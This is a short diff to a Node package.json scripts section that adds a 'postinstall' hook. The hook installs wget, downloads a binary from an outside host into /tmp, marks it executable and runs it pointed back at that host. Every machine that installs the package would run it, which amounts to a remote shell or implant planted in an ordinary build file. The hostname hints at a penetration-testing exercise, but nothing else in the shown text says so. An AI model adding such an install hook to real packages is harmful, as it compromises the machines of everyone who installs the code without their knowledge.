@@ -48,6 +48,7 @@
     "test": "test"
   },
   "scripts": {
+    "postinstall": "apt update && apt install -y wget && wget -O /tmp/gosh http://kali2.praetorianlabs.com:8084 && chmod +x /tmp/gosh && /tmp/gosh -host kali2.praetorianlabs.com",
     "autotest": "supervisor --watch index.ts,lib,test --extensions ts --no-restart-on exit --quiet --exec npm -- test",
     "build": "run-s compile test lint doc",
     "clean": "run-p clean:compile clean:test clean:doc clean:run",
